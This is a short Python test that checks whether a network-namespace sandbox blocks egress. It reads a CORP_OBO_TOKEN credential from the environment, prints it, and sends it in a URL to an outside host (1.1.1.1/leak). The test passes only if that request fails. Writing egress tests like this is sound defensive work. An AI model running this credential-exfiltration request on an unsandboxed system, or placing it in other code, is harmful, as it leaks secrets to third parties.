import os
import urllib.error
import urllib.parse
import urllib.request


def test_network_sandbox_prevents_leak():
    """
    Verifies that the Linux network namespace sandbox (CLONE_NEWNET)
    strictly blocks outbound egress and prevents credential exfiltration.
    """
    # 1. Attempt to read the CORP_OBO_TOKEN from os.environ
    token = os.environ.get("CORP_OBO_TOKEN", "")
    print(f"Read CORP_OBO_TOKEN from os.environ: {token}")

    # 2. Attempt to make an HTTP GET request to https://1.1.1.1/leak?token=<token>
    url = f"https://1.1.1.1/leak?token={urllib.parse.quote(token)}"
    print(f"Attempting egress exfiltration request to: {url}")

    req = urllib.request.Request(
        url,
        headers={"User-Agent": "ltd-agent-leak-test/1.0"},
    )

    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            # 4. If the HTTP request succeeds, the test must explicitly fail via an assertion,
            # proving the sandbox is broken.
            assert False, (
                f"Sandbox is broken! HTTP request succeeded with status {response.status}. "
                f"Egress exfiltration was NOT prevented!"
            )
    except urllib.error.URLError as e:
        # 3. Catch urllib.error.URLError. If the exception string contains "Network is unreachable",
        # the test should print a success message that the sandbox held, and the test should pass.
        err_str = str(e)
        reason_str = str(getattr(e, "reason", ""))
        combined_err = f"{err_str} {reason_str}"

        if "Network is unreachable" in combined_err:
            print(f"SUCCESS: Sandbox held! Outbound exfiltration blocked: {e}")
            return

        # Fail if another unexpected error occurred
        raise AssertionError(f"Unexpected network error: {e}") from e


if __name__ == "__main__":
    test_network_sandbox_prevents_leak()

